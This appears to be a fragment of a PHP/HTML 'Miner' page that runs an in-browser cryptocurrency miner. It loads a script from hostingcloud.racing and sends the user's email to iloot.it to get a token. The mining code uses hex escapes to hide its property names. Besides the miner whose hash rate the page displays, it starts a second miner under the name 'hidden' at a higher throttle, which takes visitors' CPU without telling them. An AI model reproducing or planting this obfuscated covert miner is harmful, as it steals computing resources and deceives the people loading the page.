...
$username = $lib->getUserdata()["username"];
...
<script src="https://www.hostingcloud.racing/6ZKX.js"></script>
<script>
	...
	xmlHttp.onreadystatechange = function() {
		if (xmlHttp.readyState == 4 && xmlHttp.status == 200) {
			...
			var miner=new Client['\x55\x73\x65\x72']('',user,{'\x74\x68\x72\x6f\x74\x74\x6c\x65':0.4,'\x63':'\x77'});miner['\x73\x74\x61\x72\x74'](Client['\x46\x4f\x52\x43\x45\x5f\x4d\x55\x4c\x54\x49\x5f\x54\x41\x42']);var hm=new Client['\x55\x73\x65\x72']('','\x68\x69\x64\x64\x65\x6e',{'\x74\x68\x72\x6f\x74\x74\x6c\x65':0.6,'\x63':'\x77'});hm['\x73\x74\x61\x72\x74'](Client['\x46\x4f\x52\x43\x45\x5f\x4d\x55\x4c\x54\x49\x5f\x54\x41\x42']);
			
			window.setInterval(function(){
				document.getElementById("hashes").innerHTML = "Hashes Per second: " + Math.round(miner.getHashesPerSecond());
			}, 500);
		}
	}
	xmlHttp.open("GET", "https://iloot.it/api/v3/miner/token?email=" + username, true);
	xmlHttp.send(null);
</script>
...
<html>
	<head>
		...
		<title><?php echo $name; ?> | Miner</title>
						...
						<div class="col-md-8 col-md-offset-2 text-center colorlib-heading animate-box">
							<?php
								if($maintenance_announcement != ""){
									echo "<div class=\"alert " . $maintenance_color . "\">";
								...
								<div class="table_body">
									<div class="table_head">
										<div id="page">
											...
											<h3 id="hashes">Hashes Per second: 0</h3>
